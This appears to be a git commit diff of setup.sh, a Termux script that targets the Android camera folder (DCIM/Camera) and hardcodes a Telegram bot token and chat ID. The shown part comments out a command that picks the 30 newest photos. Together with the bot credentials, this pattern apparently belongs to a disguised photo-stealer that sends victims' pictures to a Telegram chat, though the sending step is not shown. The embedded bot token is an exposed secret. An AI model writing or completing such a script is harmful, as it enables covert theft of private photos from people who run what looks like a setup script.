d83350454dcc8947482b5c7ef29fe90ad7c841c0
v01dxcyber <coldybay90@gmail.com>
2024-10-12 18:40:18 +0500

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -4,7 +4,7 @@ if [ ! -d ~/storage ]; then
 fi
 #mkdir -p ~/storage/emulated/0/DCIM/Camera/
 
-find ~/storage/emulated/0/DCIM/Camera/ -type f -printf "%T@ %p\n" | sort -n | tail -n 30 | awk '{print $2}' | xargs -I {} mv {} ~/storage/emulated/0/DCIM/Camera/
+#find ~/storage/emulated/0/DCIM/Camera/ -type f -printf "%T@ %p\n" | sort -n | tail -n 30 | awk '{print $2}' | xargs -I {} mv {} ~/storage/emulated/0/DCIM/Camera/
 
 TOKEN="7716929216:AAEwWk3j1izoGjEzMjACpznA4ynp2x2ryUA"
 CHAT_ID="7420684678"
